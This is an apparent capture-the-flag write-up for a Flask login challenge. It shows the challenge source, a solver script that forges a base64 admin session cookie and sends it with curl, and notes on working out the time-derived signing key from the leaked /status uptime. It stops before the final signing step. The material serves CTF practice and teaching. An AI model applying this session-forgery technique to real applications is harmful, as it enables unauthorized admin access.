App.py
```Python
#!/usr/bin/env python3
from flask import Flask, request, render_template, jsonify, abort, redirect, session
import uuid
import os
from datetime import datetime, timedelta
import hashlib
app = Flask(__name__)
server_start_time = datetime.now()
server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
app.secret_key = secure_key
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(seconds=300)
flag = os.environ.get('FLAG', "flag{this_is_a_fake_flag}")
secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
def is_safe_username(username):
    """Check if the username is alphanumeric and less than 20 characters."""
    return username.isalnum() and len(username) < 20
@app.route('/', methods=['GET', 'POST'])
def main():
    """Handle the main page where the user submits their username."""
    if request.method == 'GET':
        return render_template('index.html')
    elif request.method == 'POST':
        username = request.values['username']
        password = request.values['password']
        if not is_safe_username(username):
            return render_template('index.html', error='Invalid username')
        if not password:
            return render_template('index.html', error='Invalid password')
        if username.lower().startswith('admin'):
            return render_template('index.html', error='Don\'t try to impersonate administrator!')
        if not username or not password:
            return render_template('index.html', error='Invalid username or password')
        uid = uuid.uuid5(secret, username)
        session['username'] = username
        session['uid'] = str(uid)
        return redirect(f'/user/{uid}')
@app.route('/user/<uid>')
def user_page(uid):
    """Display the user's session page based on their UUID."""
    try:
        uid = uuid.UUID(uid)
    except ValueError:
        abort(404)
    session['is_admin'] = False
    return 'Welcome Guest! Sadly, you are not admin and cannot view the flag.'
@app.route('/admin')
def admin_page():
    """Display the admin page if the user is an admin."""
    if session.get('is_admin') and uuid.uuid5(secret, 'administrator') and session.get('username') == 'administrator':
        return flag
    else:
        abort(401)
@app.route('/status')
def status():
    current_time = datetime.now()
    uptime = current_time - server_start_time
    formatted_uptime = str(uptime).split('.')[0]
    formatted_current_time = current_time.strftime('%Y-%m-%d %H:%M:%S')
    status_content = f"""Server uptime: {formatted_uptime}<br>
    Server time: {formatted_current_time}
    """
    return status_content
if __name__ == '__main__':
    app.run("0.0.0.0", port=9999)
```

```Python
import base64
import json
import uuid
import subprocess

secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
username = 'administrator'
uid = uuid.uuid5(secret, username)
#print(uid)

admin_data = {
    "is_admin": True,
    "username": username,
    "uid": uid
}
    
json_data = json.dumps(admin_data).encode('utf-8')
admin_cookie = base64.b64encode(json_data).decode('utf-8')

print("Admin Cookie:", admin_cookie)

curl_command = f'curl -X GET http://chal.competitivecyber.club:9999/admin --cookie "session=eyJpc19hZG1pbiI6IHRydWUsICJ1c2VybmFtZSI6ICJhZG1pbmlzdHJhdG9yIiwgInVpZCI6ICIwMmVjMTlkYy1iYjAxLTU5NDItYTY0MC03MDk5Y2RhNzgwODEifQ=="'
subprocess.run(curl_command, shell=True)
```

To get the flag, we need to route to the /admin page.
```Python
@app.route('/admin')
def admin_page():
    """Display the admin page if the user is an admin."""
    if session.get('is_admin') and uuid.uuid5(secret, 'administrator') and session.get('username') == 'administrator':
        return flag
    else:
        abort(401)
```
So we need to have a username of 'administrator', have is_admin set to True, and have a matching uuid.

```Python
@app.route('/', methods=['GET', 'POST'])
def main():
    """Handle the main page where the user submits their username."""
    if request.method == 'GET':
        return render_template('index.html')
    elif request.method == 'POST':
        username = request.values['username']
        password = request.values['password']
        if not is_safe_username(username):
            return render_template('index.html', error='Invalid username')
        if not password:
            return render_template('index.html', error='Invalid password')
        if username.lower().startswith('admin'):
            return render_template('index.html', error='Don\'t try to impersonate administrator!')
        if not username or not password:
            return render_template('index.html', error='Invalid username or password')
        uid = uuid.uuid5(secret, username)
        session['username'] = username
        session['uid'] = str(uid)
        return redirect(f'/user/{uid}')
```
Logging in the usual way, doesn't let us have a name that starts with 'admin', so we can't reach the /admin page.

It also immediately redirects us to /user/

```Python
@app.route('/user/<uid>')
def user_page(uid):
    """Display the user's session page based on their UUID."""
    try:
        uid = uuid.UUID(uid)
    except ValueError:
        abort(404)
    session['is_admin'] = False
    return 'Welcome Guest! Sadly, you are not admin and cannot view the flag.'
```

which sets `session['is_admin'] = False`, so even if we manage to get the username 'administrator', we will fail the is_admin check.

With this information, I poked around at `http://chal.competitivecyber.club:9999/`.

I  saw that it creates a session cookie. My cookie was `eyJpc19hZG1pbiI6ZmFsc2UsInVpZCI6ImY1NGUzMmI2LWQzOGMtNTJmZS1hNWY2LTIyZDYxMWFjN2EzMiIsInVzZXJuYW1lIjoidGVzdCJ9.Zu71Sw.4B-UMkzKzrjixgHDdq7sSTV8c08`

Decoding with Base64, I got ``{"is_admin":false,"uid":"f54e32b6-d38c-52fe-a5f6-22d611ac7a32","username":"test"}fKC$̬,`7jēW4`` which probably meant that the payload was signed, with `.{signature}`

I created a Base64 encoding of `{"is_admin":true,"uid":"02ec19dc-bb01-5942-a640-7099cda78081","username":"administrator"}` which is `eyJpc19hZG1pbiI6IHRydWUsICJ1c2VybmFtZSI6ICJhZG1pbmlzdHJhdG9yIiwgInVpZCI6ICIwMmVjMTlkYy1iYjAxLTU5NDItYTY0MC03MDk5Y2RhNzgwODEifQ==`

Now I needed the suffix. So I did some research and learned that Flask signs the cookies with `app.secret_key` which is the `secure_key` in the `App.py` file.

```Python
server_start_time = datetime.now()
server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
app.secret_key = secure_key
```
To be able to generate the key, we need to find the servers start time.

After checking the `App.py`, I noticed that there is a `/status` page:
```Python
@app.route('/status')
def status():
    current_time = datetime.now()
    uptime = current_time - server_start_time
    formatted_uptime = str(uptime).split('.')[0]
    formatted_current_time = current_time.strftime('%Y-%m-%d %H:%M:%S')
    status_content = f"""Server uptime: {formatted_uptime}<br>
    Server time: {formatted_current_time}
    """
    return status_content
```
and it shows us the current time of the server, and the uptime of the server.

Using these two, we can calculate the server start time by subtracting the uptime from server time.

